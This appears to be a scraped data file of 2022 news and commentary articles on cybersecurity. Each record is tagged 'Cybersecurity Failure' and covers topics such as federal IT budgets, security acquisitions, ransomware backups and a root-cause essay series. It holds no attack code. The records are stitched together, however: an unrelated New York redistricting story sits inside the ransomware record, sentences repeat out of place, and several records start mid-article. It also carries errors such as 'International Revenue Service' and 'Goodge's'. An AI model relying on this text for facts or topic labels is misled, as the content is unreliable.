2. Adopting a hybrid workplace

On June 10, 2021, Biden’s administration announced that federal agencies would start working on a hybrid setup. The Office of Personnel Management, GSA, and Office of the Management and Budget issued the memorandum.

This means cybersecurity will remain the highest priority due to the 150% rise in ransomware attacks since 2021. It resulted in 61% of malware attacks mainly targeting remote workers, which is why remote workers require more support regarding security concerns, accounting for the increased network and government spending budgets.

3. Advancement of citizen digital identity and cloud strategies

Another significant factor driving IT spending data is cloud computing, which the federal government has used since 2009. Expenses of cloud computing only represent a small fraction of the budget. Market researchers have estimated that the federal government yearly allocates $1 to $7 billion on cloud computers.

Digital identity management refers to technologies used by agencies to identify and authenticate users online and manage access privileges for online applications and services. It has been used by the military personnel and the Department of Defense (DOD). It has recently gained traction among civilian agencies due to mobile technology and cloud computing infrastructure advances.

4. Modernization of defense against cybersecurity attacks

In a Washington Post report in 2021, Congress announced that cybersecurity defenses would be a priority for 2022. The federal cybersecurity defense modernization was mainly in response to the recent incident by Russian hackers in the systems of a hundred American companies and nine federal agencies, including the Department of Commerce, Treasury, and Justice, that remained undetected until December.

It was detected by a private cybersecurity company, FireEye, which found it in SolarWinds software. This prompted the Government Accountability Office (GAO) to declare federal cybersecurity as one of the most urgent and riskiest areas that need to be addressed.

Other notable information technology modernization is shared services, cloud adoption, and IPv6. At the same time, the Treasury Department included a 20% increase in funding enacted last year, leaving a total of $16.2 billion to strengthen defenses against attacks from high-profile entities and implement the zero-trust strategy for vulnerabilities.

Highlights of government IT spending

President Biden aims to increase the annual federal IT spending consistently. His budget request included the $58.4 billion for the new administration’s agency-level maintenance and technological improvements. It will improve the delivery of critical services, keep systems secure, keep sensitive information, and improve the digital government’s vision. Also, it includes funding for over 4500 IT investments supporting at least 25 agencies’ missions and other significant IT investments. It’s broken down into three portfolio areas:

Federal financial data of civilian agencies

Biden’s budget for this fiscal year aims to improve the cyber and IT workforce to make the nation’s government a desirable employer for high-profile professionals, strengthen our abilities to see and administer government-wide projects, and effectively deliver services to American citizens. These are among the top 25 agencies that ranked the highest in the federal spending data:

1. Department of Veterans Affairs

The Veteran Affairs (VA) department is currently working on the most comprehensive information technology infrastructure modernization project in the federal government. It aims to support the easy transition of health care information through a citizen’s journey from doing military service to becoming a veteran.

Also, VA was concerned about the software and business gaps supporting VA logistics, infrastructure operations, and procurement systems. The Veteran’s Health Administration is adopting the Defense Department’s software platform, Defense Medical Logistics Standard Support (DMLSS) IT system for the VALOR program, which can improve and modernize its property, health care technology, and supply chain.

2. Department of Homeland Security

The budget of the Homeland Security Department aims to fund cybersecurity challenges and incidents mainly. The Cybersecurity and Infrastructure Security Agency (CISA) secured $650 million for the American Rescue Plan Act. CISA will use the funds to strengthen cybersecurity tools, employ highly qualified experts in the field, gather enough support services, and secure federal information technology systems.

3. Department of Health and Human Services (HHS)

HHS is one of America’s largest health insurers and one of the largest grant-making agencies. The agency ranks third in the list with the highest IT budget requests for this year, asking for almost 7 million, although there are few details on why they asked for that amount. It also asked for $715 million for cybersecurity measures, a 20% increase compared to the last fiscal year.

4. Department of Treasury

The International Revenue Service (IRS) is expected to receive $13 billion to fund taxpayer services that would let the IRS continue delivering services through methods of in-person, web-based, or telephone. It also has budgeted for IT modernization, such as the Business Systems Modernization Account platform.

5. Department of Transportation

The department of transportation proposed a budget for its multiple-year improvement projects. It has decided to receive $93 million for a shared-services environment for commodity IT investments. It also needs $39.4 million to improve IT infrastructure security, data protection, new identity, access management capabilities, and implementation of enhanced security controls on mobile devices and agency computers.

Five ways the government can save on IT spending

After getting through the biggest challenges of the global pandemic, all government sectors are facing financial strain. All expenses continue to escalate, and the need for more assistance, particularly in medical services and fiscal stimulus, is rising. Also, taxes and revenue have been dramatically affected too.

A significant decrease in GDP has been observed in the past years since 2019. The leaders continue to find answers to the questions: How to lower costs while maintaining high levels of impact? How to be effective with less spending? and so much more. Here are five ways the government can make it possible in IT spending:

1. Terminate at least 30% of the underperforming projects on information technology within the next two years

There are too many projects in the U.S. government that were started and abandoned before completion because they were already obsolete. According to a Boston Consulting Group survey, it estimated that around 70 to 80% of public sector IT projects, especially modernization, are failures, which is a waste of taxpayer dollars.

2. Look out for contractors overcharging for their products and services

There are often multiple options available at different prices for IT products. The government should insist on getting better deals by purchasing around from its various contractors before awarding contracts and ensure it’s not paying too much when buying new systems and replacing old ones. It can also hold contractors accountable when they overcharge.

In 2012, W.W. Grainger paid $70 million as a resolution for overcharging federal government agencies for hardware supplies when it could not disclose expenses and provide accurate audit information.

3. Cut down on federal centers

Multiple agencies use different systems for similar work and even use the same system with different features and capabilities. A good example is cloud computing, where agencies can choose different providers for similar services. The solution here is to eliminate duplicate services and units that are often labor-intensive, expensive, and slow.

According to the Department of Energy, federal centers currently account for about 2% of the total energy consumption in the U.S. In 2020, 24 agencies planned on closing 46 data centers and were able to close up 96 units, saving up close to $900 million.

4. Hire specialized IT acquisition professionals

It’s recommended that agencies hire more specialized staff to avoid overspending on software licenses and IT services. These may be chief information officers or chief technology officers. They have deep knowledge of how networks and computers operate to make informed decisions about hardware purchases and software licenses.

Some states, such as New York and Texas, have begun requiring these professionals at all state government levels through proposed executive orders. However, it’s not yet widespread nationwide.

5. Stop using outdated software

Biden’s budget proposal of $58.4 billion is mainly for IT modernization and enhanced security. According to a Technology CEO Council report, the federal government’s continued technological innovation could save over $1 trillion in the next decade in data and analytics, improper payments, cybersecurity, fraud, and more.

In addition, the General Services Administration has launched an effort to wipe out old software and transition to often less expensive cloud services and other new technologies. As the first federal agency to adopt Goodge’s cloud-based platform, it saved up to $2 million in 2012.",Cybersecurity Failure,2022-06-13 08:20:03

The cloud-based cybersecurity vendor was bought last year by venture capital firm Thoma Bravo for $12.3 billion and earlier this year acquired Dathena, a data security startup.","RSA Conference IBM has expanded its extensive cybersecurity portfolio by acquiring Randori – a four-year-old startup that specializes in helping enterprises manage their attack surface by identifying and prioritizing their external-facing on-premises and cloud assets.

Big Blue announced the Randori buy on the first day of the 2022 RSA Conference on Monday. Its plan is to give the computing behemoth's customers a tool to manage their security posture by looking at their infrastructure from a threat actor's point-of-view – a position IBM hopes will allow users to identify unseen weaknesses.

IBM intends to integrate Randori's software with its QRadar extended detection and response (XDR) capabilities to provide real-time attack surface insights for tasks including threat hunting and incident response. That approach will reduce the quantity of manual work needed for monitoring new applications and to quickly address emerging threats, according to IBM.

Attack surfaces are expanding, IBM said, citing research from analyst outfit Enterprise Strategy Group (ESG) that found 67 percent of organizations expanded their external attack surface over the past two years. That growth came from increased use of clouds, third-party services, and the Internet of Things (IoT). The research also found that 69 percent of organizations were compromised via internet-facing assets.

""In this environment, it is essential for organizations to arm themselves with attackers' perspective in order to help find their most critical blind spots and focus their efforts on areas that will minimize business disruption and damages to revenue and reputation,"" Mary O'Brien, general manager of IBM Security, explained in a statement.

Perimeter 81 becomes a Unicorn

IBM's Randori announcement came the same day that Perimeter 81 – a network security startup that also launched in 2018 – reached unicorn status with a $100 million Series C funding round that lifted the total amount it has raised to $165 million and boosted its valuation beyond $1 billion. The company, which offers cloud-delivered services including zero-trust network access and firewall-as-a-service, has focused on the secure access service edge (SASE), but says its platform is more suited for the nascent secure service edge (SSE) space.

""To securely empower the modern workforce, we've built a highly intuitive platform that streamlines network security management and enables businesses to easily secure remote access, network traffic, and endpoint devices,"" co-founder and CEO Amit Bareket wrote in a blog post.

The two announcements are the latest examples of cybersecurity vendors working to secure organisations that adopt multicloud strategies and see their IT environments stretch beyond traditional datacenter into the cloud and out to the edge. They are looking for tools to shrink their attack surfaces and protect their far-flung data and applications.

The demand for cybersecurity products and services only accelerated with the COVID-19 pandemic and the rapid shift to remote work. The drumbeat of acquisitions by established players looking to build more complete cybersecurity portfolios and the massive amounts of money being invested in startups further reflects the importance of the technologies.

Cybersecurity advisory firm Momentum Cyber in a report noted that in 2021 – which it described as a ""landmark and record smashing year"" – there was $77.5 billion in M&A volume in the cybersecurity space and $29.3 billion in private equity (PE) and venture capital (VC) investments.

""Right now, large companies are trying to buy security companies to build a portfolio and/or marketshare,"" John Bambenek, principal threat researcher at cybersecurity vendor Netenrich, told The Register in an email.

""We know there is 'big money' in cybersecurity because there are huge losses due to security incidents and, meanwhile, cyber insurance is pulling back and/or hiking premiums. At this point, it's like a 'curing cancer' problem. Whoever can figure it out will get all the money.""

Many enterprises have mature cybersecurity postures, but they're still getting breached, Bambenek said, adding that the ""metrics suck and aren't tied to the reality on the ground. The security industry isn't solving fundamental problems. Ten years in we still have ransomware.""

Also at RSA

Also at RSA, CySafe, which was founded in 2014, announced Monday it closed a $28 million Series B round, bringing its total amount raised to $40 million. CySafe's software platform helps companies manage human cyber risks via security awareness and training.

Last week, JupiterOne, like Randori another startup in attack-surface management space, announced $70 million in Series C funding, driving the total amount raised to more than $119 million and – like Perimeter 81 – hitting a valuation of more than $1 billion.

Beyond Identity in February said it raised $100 million in Series C funding, bringing its valuation to $1.1 billon. Other companies announcing recent investments include Semperis ($200 million), Ordr ($40 million) and Seemplicity ($32 million). Meanwhile, an alliance announced Monday between Netskope and Deloitte to help joint customers adopt SASE comes less than a week after Netskope bought IoT security startup WootCloud.

Proofpoint has seen both sides of this. The cloud-based cybersecurity vendor was bought last year by venture capital firm Thoma Bravo for $12.3 billion and earlier this year acquired Dathena, a data security startup.

Netenrich's Bambenek said that given the current state of cyber threats, don't expect the hyperactive cybersecurity M&A and investment trends to slow anytime soon.

""Breaches and costs are increasing due to security failures,"" he opined. ""It's known at the board level what the business risks to cybersecurity failures are and those costs are driving willingness to invest. That willingness means there is a bigger pool of money to fight for, which means the VC and PE crowd understand there is opportunity there."" ®",Cybersecurity Failure,2022-06-07 01:30:00

Sonny Phengsomphone stood in the woods of Laos, near the banks of the Mekong River. Alongside his mother and sister, he peered through the darkness that befell the Mekong. His father, having told the family to stay put, had set out alone in search of a boat to bear them across the water. They waited.

Just across the river situated salvation: a Thai refugee camp. Hundreds of thousands of people had crossed the same water body for that same reason, and it was no easy feat. Those who embarked on the swim potentially faced death: drowning, or catching bullets from Laotian soldiers.

After trudging through the murky river, Phengsomphone’s father eventually landed upon a bordering residence, which crucially contained a docked boat. Assisting refugees was illegal, and expecting opposition, he brought an important commodity: gold.

Tempting the homeowner with the valuables, he secured the raft, on one condition: do what you have to do, but bring it back immediately.

“Maybe that [trade] is kinda how I got my business savviness [from my dad],” laughs Sonny Phengsomphone.

As owner and founder of Worcester cybersecurity company BitSpartan and co-owner of Northborough nail salon Lush Nail Lounge, Phengsomphone’s tale of immigration illuminates a key trait necessary to entrepreneurs: perseverance.

The Phengsomphones fled their home country in 1985. Laos, which had ended its 16-and-a-half year civil war only a decade before, was essentially a totalitarian state. The new government imposed several restrictions on civil liberties, including threats of physical violence against political dissidents.

Both tourism and emigration were effectively banned, so there was only one way to leave the country: escape.

“There were a lot of human rights violations,” said Phengsomphone. “People were scared of the government … We were fleeing Laos, and I say flee because there weren't any humanitarian [organizations] to help us get to another country.”

As the family waiting on the banks of the Mekong, Phengsomphone’s father eventually returned, and off the four went. After trekking through the Thai wilderness, and narrowly avoiding brushes with immigration officials, they landed at the refugee camp.

Thus spearheaded the start of a new life.

A refugee turned IT professional

The family stayed in the refugee camp for about three years, during which time Phengsomphone’s sister passed away. Ultimately, they received sponsorship from a person in the United States, which required them to move to a U.S. immigration facility in the Philippines. They stayed there for about a year, during which time Phengsomphone’s younger brother was born.

Finally, in 1988, the family reached the U.S. Phengsomphone first arrived in Rockford, Ill., close to his sponsor, before eventually moving to New England. Phengsomphone’s family first landed in Hartford before settling in Woonsocket, R.I.

In Hartford, Phengsomphone figured out the course for his life.

“I was in seventh grade when my teacher said, ‘Hey, this is what you can do,’” Phengsomphone said. “And she gave me a list of all the fields that I could get into.”

Combing through that list, two fields piqued his interest: engineering and computing. This was due, in part, to its starting pay being significantly higher than what his parents made.

“I can make, you know, three-to-four times the amount of money my parents made [as an engineer]. My dad, who woke up at five in the morning, and came home with oil and grease stuck in his skin and eyes … while [in IT] I can use my brain, wear a suit and tie, be clean, and also make much more money,“ Phengsomphone said. “From then on, I’ve always had that in my head.”

Carrying this mindset throughout high school, it eventually helped Phengsomphone secure an internship at Amica Insurance in Lincoln, R.I. There, he met an adjunct professor from Johnson & Wales University in Rhode Island, who invited him to the university’s then-new IT degree program. Knowing college was necessary to live the life he aspired to, he pounced on the opportunity.

Due to the family’s low income, he feared he would start from a disadvantaged position to pay for college. However, through scholarships and federal grants, he secured an education at Johnson & Wales. He graduated with a bachelor’s degree in information technology in 2005, then immediately started work as a technical project manager with Connecticut consulting company Pitney Bowes.

Later, he worked four years as a systems administrator with Millbury material solutions company Barrday. Traveling daily to there from Woonsocket, he had his first exposure to his future home: Worcester.

His first taste of entrepreneurship

Phengsomphone continued to work at several IT companies for over a decade in various positions, including senior positions as a systems administrator, mainly specializing in infrastructure technology. Eventually, he made the move to Central Massachusetts, arriving in Northborough to be closer to his job at tech consultant NFP Health in Braintree.

While living in Northborough, and with the influence of his girlfriend, a cosmetologist, he had his first taste of business ownership. Despite him having no entrepreneurial experience, in 2017 the two and another family member founded the Lush Nail Lounge, off Route 20 in Northborough.

“I knew nothing about opening my own business. I knew nothing about the beauty industry … but I made sure to give it my all to see the successful outcome of it. Some of the things in my life have yielded great results because of this belief [of giving my all],” Phengsomphone said.

While remaining co-owner of the lounge, he continued to work at NFP Health until late 2020. During this time he moved to Worcester with his girlfriend, partially to save money, but also because he had his eyes on something new: his own cybersecurity company.

Creating his own success

Working under other people for nearly 20 years eventually made Phengsomphone disillusioned.

“I came to a point in my career where I wasn’t happy where I was,” Phengsomphone said. “I just [didn’t] want to work for anyone else anymore.

""I have always put 100% into my work [under others], but never received a great outcome from it,"" he said, referring to his desire to reach his full potential as a professional and a business owner.

With that as a motivator, Phengsomphone secured capital and founded BitSpartan Security, in December of 2020. Seeing all the new developments in Worcester since his time at Barrday in 2008, he was inspired, and so he founded BitSpartan right in the heart of downtown at the WorcLab incubator in the Printers Building.

The business offers cybersecurity services to businesses throughout the commonwealth. Phengsomphone said he chose cybersecurity as it was more fulfilling than working on computer infrastructure systems, because cybersecurity specifically deals with the protection of individual people.

“I realized maybe five or six years ago that [cybersecurity] was my passion,” Phengsomphone said. “When I started looking at [cybersecurity], I realized that it was a much larger issue than just business alone … I’m not just helping organizations, but individual people. And if that information isn’t protected, we have the issues that we see today.”

The cybersecurity market is expected to grow 7% annually in the U.S. over the next five years and become a $212-billion market globally by 2026, according to Germany-based market intelligence provider Statista.

Cybersecurity is an ever-growing, big business, and it's even bigger for the criminals, said Michelle Drolet, CEO and founder of Framingham cybersecurity company Towerwall.

“It’s a trillion-dollar industry [for the criminals],” Drolet said. “It’s never ending. [Attacks] will always be present. I predict by 2025, there’s going to be over two million jobs in the cybersecurity space.”

Following some snags and logistical issues, Phengsomphone opened BitSpartan's doors to the public in spring of this year. At this stage, the company is working to secure contracts with state and federal agencies, as well as working on gaining contractors and freelancers.

While the future of the business’s prosperity is unknown, Phengsomphone remains confident in any outcome.

“At my [past] job, I’ve made sure [other businesses] are successful,” Phengsomphone said. “Why can’t I do that for myself? Why can’t I do that for my family? Bottom line, there’s no one telling you that you can’t do something. You can show your own success. I feel at this stage in my life … that if I pursue something, and even if it ends in failure, I would be fine with that. Because I actually tried doing it.”",Cybersecurity Failure,2022-06-13 10:00:05

But by choosing to ignore vulnerabilities, organisations are leaving themselves open to cyberattacks and other security issues.

Also: Cybersecurity: Let's get tactical (ZDNet special report)

Unpatched security vulnerabilities are one of the most common weaknesses exploited by cyber criminals to successfully hack networks and software. Even patches for critical vulnerabilities are not applied by many, sometimes for years, giving hackers an easy way in for as long as the updates haven't been rolled out.

Many organisations aren't taking security seriously because boardrooms view it as a hindrance – according to the research, two-thirds of security professionals have been told that taking care of cybersecurity is viewed as stifling innovation.

However, if employees aren't aware of cybersecurity risks and don't have appropriate measures put in place to maintain security, there's the risk they could circumvent best cybersecurity practices.

For example, if employees think that having to log in to enterprise software suites and use the approved collaboration tools is less effective and more time-consuming than using a personal email address for sharing sensitive information, they could inadvertently expose sensitive data.

Almost two-thirds of cybersecurity professionals surveyed say that their organisation has suffered a security breach as a result of staff side-stepping cybersecurity measures, while just a quarter said they're very confident that their staff is following cybersecurity best practices.

The report also warns that developers are often pressured to release insecure products, putting organisations that use potentially vulnerable software at risk of being compromised.

According to HackerOne, it's vital for organisations to commit to more transparency around cybersecurity. ""Security could be the difference between winning business and losing it,"" Marten Mickos, CEO of HackerOne, told ZDNet.

Even if organisations do fall victim to a cyberattack, being transparent about what happened can help improve the reputation of the company. Mickos cites Norsk Hydro, which fell victim to a ransomware attack and was transparent about the entire recovery process as an example of this situation.

""The organisation took the responsibility to ensure frequent and candid communications with customers and the wider public, to keep everyone updated on how events were unfolding,"" he said.

""Not only did Norsk Hydro maintain customer trust by being transparent about what was happening, the organisation also had the power of exposing key information on the tactics being used by cyber criminals, which is beneficial to the wider industry and other organisations facing growing cyber risks,"" Mickos added.

Kruger offered some thoughts on computer security recently at Expensivity and we appreciate the opportunity to republish them here. He starts with “Root Cause Analysis 101”

David A. Kruger

The classic line “I have a bad feeling about this” is repeated in every Star Wars movie. It’s become a meme for that uneasy feeling that as bad as things are now, they are about to get much worse. That’s an accurate portrayal of how many of us feel about cybersecurity. Our bad feeling has a sound empirical basis. Yearly cybersecurity losses and loss rates continually increase and never decrease despite annual US cybersecurity expenditures in the tens of billions of dollars and tens of millions of skilled cybersecurity man-hours. Cybersecurity’s record of continuously increasing failure should prompt thoughtful observers to ask questions like “Why are cybersecurity losses going up? Why isn’t cybersecurity technology reducing them? Are there things we don’t understand or are overlooking?”

That’s easy to answer: Of course, there are! After spending this much time, money, and brainpower on cybersecurity without managing to decrease losses, much less eliminating them, it’s painfully obvious something isn’t right.

This article explains what we get wrong about cybersecurity, how and why we get it wrong, and how to fix it. Fair warning: it’s a long and bumpy road. There a healthy dose of counterintuitive assertions, cybersecurity heresy, and toes stepped on, but at roads end you’ll know what the true cause of cybersecurity failure is and how to fix it.

Part One – Cybersecurity Technology

The Heart of the Matter

When confronted with a chronic problem, we human beings are prone to err by trying solutions without first asking the right questions. We tend to ask, “How do we stop this now?” and fail to ask, “What’s causing this?” Then we are shocked when our fixes don’t last. This tendency is so common that safety engineers developed a formal analytical method called a root cause analysis to prevent this error. Root cause analysis is designed to find unidentified causes of recurring failure. A root cause analysis starts with an effect, in this context, a failure, and works upstream all the way through the chain of causation until the root cause is found. In complex systems like computers, finding the root cause of failure is critically important because an unidentified root cause makes multiple downstream elements of the system much more prone to fail. You can tell when you’ve found the root cause, because if you fix it, the downstream recurring failures cease.

Identifying the root cause in complex systems can be hard because:

A single root cause can spawn multiple instances and types of failure because a single root cause can spawn multiple chains of cause and effect. The chains can be long, having many intermediate cause and effect links between the root cause and the failure. The more links in the chain, the longer the “distance” between the root cause and the failure. Long chains branch and intersect with other chains, which makes it even more difficult to identify the root cause. Usually, the longer the distance is between an unidentified root cause and the failures it’s causing, the harder the root cause it is to identify. The shorter the distance between an intermediate cause and the failures, the easier the intermediate cause it is to identify. Intermediate causes are obvious, unidentified root causes are not—and that’s why root causes are so often overlooked.

Because of these difficulties, problem solvers can easily fall prey to the symptomatic solution fallacy, a mistaken belief that solving intermediate problems can permanently stop long distance failures. It’s called the “symptomatic” solution fallacy because it’s the engineering equivalent of a doctor believing that a treatment is curative when it only temporarily alleviates symptoms of an undiagnosed chronic disease. For example, a dose of pain medication can temporarily alleviate suffering, but it can’t cure the cancer that’s causing the pain.

To see how root cause analysis aids in finding and fixing unidentified root causes, we’ll review a common real world root cause analysis and then take the lessons learned and apply them to cybersecurity technology and then to cybersecurity policy.

Root Cause Analysis 101

The purpose of automaker safety recalls is to prevent recurrent failures attributable to a previously unidentified root cause. Recently, 700,000 Nissan Rogue SUVs were recalled because:

“In affected vehicles, if water and salt collect in the driver’s side foot well, it may wick up the dash side harness tape and enter the connector. If this occurs, the dash side harness connector may corrode and possibly cause issues such as driver’s power window or power seat inoperative, AWD warning light ON, battery discharge, and/or thermal damage to the connector. In rare cases, a fire could potentially occur, increasing the risk of injury.”

Lesson Learned 1. A root cause analysis, and ultimately the recall, was initiated by the automaker because it observed a pattern of multiple types of recurring failure that appear to be related, in this case multiple types of electrical failures.

Lesson Learned 2. From the perspective of the driver, if your power windows or seats stop working, or your care won’t start because the battery is dead or wiring in the dashboard of your 2014-2016 Nissan Rogue catches fire, it’s apparent that the problem is electrical. The root cause analysis revealed that the closest cause to these electrical failures was obvious, a corroded wiring harness connector.

Now, imagine the automaker had identified the wiring connector as the root cause and declared that replacing it was a permanent fix. It would soon be evident that the automaker had fallen prey to the symptomatic solution fallacy because replacing the connector would not be a permanent solution. The still unidentified and unfixed root cause would cause the replacement connector to corrode again, which, in turn, would cause one or more of the related failures to recur.

Key Point: After a fix has been applied, if related failures continue recurring, it’s evident that an intermediate cause was erroneously identified as the root cause.

Lesson Learned 3. Working the chain of causation backwards, the automaker deduced the cause of corrosion was exposure to moisture and a corrosive. What was the source? They deduced that the wiring harness tape wicked moisture and salt up to the connector, but where did the water and salt come from? They deduced the wiring harness was being wetted as it traversed the footwell.

The potential presence of water and salt in the footwell of an SUV is a known operating condition. A given vehicle may or may not encounter salt and water during its lifetime, but it is a known potential operating condition for all SUVs. The automaker neglected to take this known operating condition into account when selecting the routing and the physical characteristics of the tape used to wrap the wiring harness. Therefore, the root cause of failure is that the automaker neglected to compensate for a known operating condition in its design. Note that this finding is axiomatic; truly unforeseeable root causes are rare.

Key Point: In complex systems, it is axiomatic that recurring failures attributable to a previously unidentified root cause nearly always results from neglecting to compensate for known operating conditions in the design.

Lesson Learned 4. Now that the root cause has been identified, the automaker will conduct a requirements analysis to clarify operating conditions, needs, and goals of the fix, and then redesign to compensate for overlooked operating condition and minimize their and their customers’ risk and expense.

Lesson Learned 5. Since the automaker neglected to compensate for a known operating condition—potential exposure of an SUV to water and salt—in their design, the automaker is responsible legally, financially, and morally, for fixing the affected vehicles and making certain that the overlooked operating condition is compensated for in the design of all future models.

Summary of Root Cause Analysis Lessons Learned:

Lesson Leaned 1: A pattern of multiple types of recurring related failures indicates the presence of an unidentified root cause.

A pattern of multiple types of recurring related failures indicates the presence of an unidentified root cause. Lesson Learned 2: If repeated fixes fail to stop recurring failures, it indicates fixes are being applied to intermediate causes (symptoms), rather than to the root cause.

Lesson Learned 3: It is axiomatic that neglecting to compensate for a known operating condition in the design is nearly always the root cause.

It is axiomatic that neglecting to compensate for a known operating condition in the design is nearly always the root cause. Lesson Learned 4: To fix the root cause, a redesign compensating for the overlooked operating condition is required.

To fix the root cause, a redesign compensating for the overlooked operating condition is required. Lesson Learned 5: The designers neglected to compensate for a known operating condition, therefore, they are responsible for fixing existing and new designs.

Next: What’s Wrong with Cybersecurity Technology?

Here are all thirteen segments in the series:

The true cause of cybersecurity failure and how to fix it Hint: The cause and fix are not what you think. David A. Kruger, a member of the Forbes Technology Council, says it’s getting worse: We’re in a hole so stop digging! Get back to root cause analysis.

What’s wrong with cybersecurity technology? Know your enemy: The target isn’t networks, computers, or users; they are pathways to the target —gaining control of data. The challenge: If a cyberdefender scores 1,000,000 and a cyberattacker scores 1, the cyberattacker wins, David Kruger points out.

Ingredients that cybersecurity needs to actually work Software makers continue to produce open data as if we were still living in the 50s, and the Internet had never been invented. Forbes Council’s David Kruger says, the goal should be safety (preventing harm) rather than, as so often now, security (reacting to hacks with new defenses).

Cybersecurity: Put a lid on the risks. We already own the lid. Security specialist David Kruger says, data must be contained when it is in storage and transit and controlled when it is in use. Cyberattackers are not the problem; sloppy methods are. We must solve the problem we created one piece of data or software at a time.

The sweet science of agile software development Effective security, as opposed to partial security, increases costs in the short run but decreases them in the long run. Software veteran: Getting makers to change their priorities to safer products safe rather than the next cool new feature will by no means be easy.

Computer safety expert: Start helping ruin cybercriminals’ lives. Okay, their businesses. Unfortunately, part of the problem is the design of programs, written with the best of intentions… First, we must confront the fact that software makers are not often held responsible for the built-in flaws of their systems.

The cybercriminal isn’t necessarily who you think… Chances are, the “human data collector” is just someone who works for a company that makes money collecting data about you. Did you know that his bosses have paid gazillions in fines for what he and his fellows do? Let’s learn more about what they are up to.

Sometimes, money really is the explanation. Today’s internet is a concentration of power, in terms of information, never before seen in history. The HDCs (human data collectors) treat us as guinea pigs in a thoroughly unethical experiment designed to learn how to manipulate the user most effectively.

How search engine results can be distorted Search providers such as Google are able to increase their ad revenues by distorting the search results delivered to users. Human data collectors (HDCs) have been able to evade responsibility for the preventable harms they cause by blame shifting and transferring risk to users.

How online human data collectors get free from responsibility Cybersecurity expert David A. Kruger talks about the Brave Old World in which you have much less power than Big Tech does. For Big Tech, government fines and other censures are merely a cost of doing business, which makes reform difficult at best.

Cybersecurity: Why a poke in the eye does not work. The current system punishes small businesses for data breaches they could not have prevented. Computer security expert David Kruger says the current system makes as much sense as fining the hit and run victim for not jumping out of the way.

Is your data about yourself too complex for you to manage? That’s the argument human data collectors (HDCs) make for why they should be allowed to collect and own your data. Policymakers should declare that human data is the property of the individual, not of the data collector, computer security expert David Kruger argues.

and

How software makers will push back against reforms Software makers will grumble but insurers may force their hand. That, however, is NOT the Big Battle… the Big Battle: Wall Street will oppose reforms that restore control to you because the market cap of Big Tech depends on human data collection.",Cybersecurity Failure,2022-04-05 07:00:00

In the past 12 months, 76% of organizations have been affected by ransomware attacks, constituting a 15% YoY rise according to Veeam’s Data Protection Trends Report 2022. As well as being more common, ransomware is also getting more potent. When businesses are struck by ransomware, they are unable to recover over a third (36%) of the data they lose on average. The threat landscape is as volatile as it has ever been. There are more attacks taking place. They are more diverse. And they can have grave consequences for the companies they affect.

On the other hand, rather than tremble with fear at the awesome power of the cyberattacks waiting to be deployed against them, organizations must focus on what they can control – their defense. Protecting your business against cyber-attacks requires following some fundamental and consistent principles – no matter what is being thrown at you.

The ransomware ‘Wild West’

There is a lawless and brutal feeling about the current cyber landscape businesses operate in. It is difficult for governments to hold cybercriminals to account and businesses are often keen to minimize public attention towards an incident that has compromised them. This contributes to a situation where almost all of the focus is on the victim (the business) rather than the criminal (the attacker).

Furthermore, ransomware – and most contemporary cybercrime – is almost indiscriminatory in terms of those who suffer. The fact is that every business is a target. Yes, hacktivist organizations such as Anonymous use organized cyber-attacks as a means of exercising social justice and to call out businesses or governments they view as immoral, unlawful, or dangerous. But even the most philanthropic and virtuous companies can find themselves begging a cybercriminal gang to restore their data and systems while a hefty ransom is demanded of them to do so.

You often see a comparison made between cyber-attacks and fishing. Hence the term ‘phishing’ which refers to using an email or text being used as bait to trick a victim into ‘biting’ – in this case clicking on the link and unwittingly downloading malware onto their device. With ransomware especially we are now seeing industrial-scale attacks being carried out, which are more analogous to trawler fishing. This isn’t one guy with a rod casting out to get a bite off one or two fish. It’s AI-infused algorithms programmed to target everyone and everything – playing a blind numbers game to catch whatever it can.

This indiscriminate nature is compounded by the fact that cyber-attacks are generally difficult to contain. For example, cyber warfare between nation states is a threat to every organization – not just those deemed to be in the firing line. We saw this with the NotPetya attack in 2017 – an attack on a specific utility company – which impacted multiple unrelated organizations through an entirely organic spread of the chaos. Attack types also continue to evolve. For example, the LokiLocker attack was one of the first reported strains of ransomware to include a disk wiper functionality. This means organizations are not only held to ransom by having services suspended and threats of data extortion. Now they are being threatened with losing vast swathes of data completely if they do not pay up.

Consistent principles of defense

There is some good news for businesses. No matter how scalable, spreadable, or malicious an attack is, these various evolutions can be viewed as attackers simply using more and bigger guns. The fundamental principles of how you prepare your defenses against even the most sophisticated and powerful ransomware stay relatively the same.

First, practice impeccable digital hygiene. All employees must be trained to identify suspicious content and be warned of the impact that malpractice using work devices can lead to. For all the might at the hands of cybercriminals, in many ways their biggest weapons are unsuspecting employees who give them the keys to the back door of an enterprise network. Given the scatter gun approach now adopted by many cyber-attacks, criminals are not necessarily targeting your organization specifically. But if you prove to be an easy hit, you’ll become a victim.

With that said, all businesses must prepare for their defenses to fail – no matter how robust you might think they are. Concepts such as zero trust and deploying techniques such as two-factor authentication can be useful for restricting the access an attacker has to data by taking over one individual’s workstation. Ultimately, the best way to protect data is to ensure that it has been securely backed up and is fully recoverable before an incident takes place. Follow the 3-2-1-1-0 backup rule, which states there should always be at least three copies of data, on at least two different types of media, at least one off-site and one immutable or offline, with zero unverified backups or errors.

While the headlines and constant discussion around cybersecurity and ransomware can be daunting, it’s important to remember than the fundamental actions required to protect data remain the same.

Ritchie Torres of the Bronx plans to introduce two bills on Monday that would make the appointment of a special master a “last resort” in the redistricting process while ensuring any mapmaking software undergoes rigorous scrutiny.

Torres, a Democrat, said he was not pleased with the state’s disastrous redistricting process this year: A court-appointed special master redrew congressional and state legislative maps after maps drawn by the Democrat-led state Legislature were deemed unconstitutional. The ruling was the result of a lawsuit filed by Republicans accusing the state Legislature of approving maps that favored Democrats. Those maps were created after the state-backed redistricting commission failed to agree on new district lines.

One of Torres’ bills would mandate courts give state lawmakers or the redistricting commission a chance to exclusively correct congressional maps before hiring a special master. Only if lawmakers fail to redraw congressional maps to the court’s satisfaction, would a special master be appointed.

“It should have at least one opportunity to cure whatever constitutional or statutory violations have been found by a court,” said Torres, who already introduced a bill calling for more redistricting hearings. He also said the appointment of a special master should be a “last resort.”

In April, Jonathan Cervas, a Carnegie Mellon post-doctoral fellow from Pennsylvania, was hired to redraw the maps that were released last month. Torres said the move subverted the powers of state lawmakers and there was “nothing remotely democratic about an out-of-state special master” to determine New York’s “next ten years of congressional representation.”

Jeffrey Wice, a professor at New York Law School who specializes in redistricting, said the proposed legislation is a “good bill” that would “avoid part of the fiasco we’ve seen this year with congressional redistricting in New York.”",Cybersecurity Failure,2022-06-13 14:20:33

There can be several loopholes that can make you fall into the cyberattack pit. Every organization has a different infrastructure and way of handling business data. Here, we will be listing out the possible reasons behind cybersecurity and information security failures.

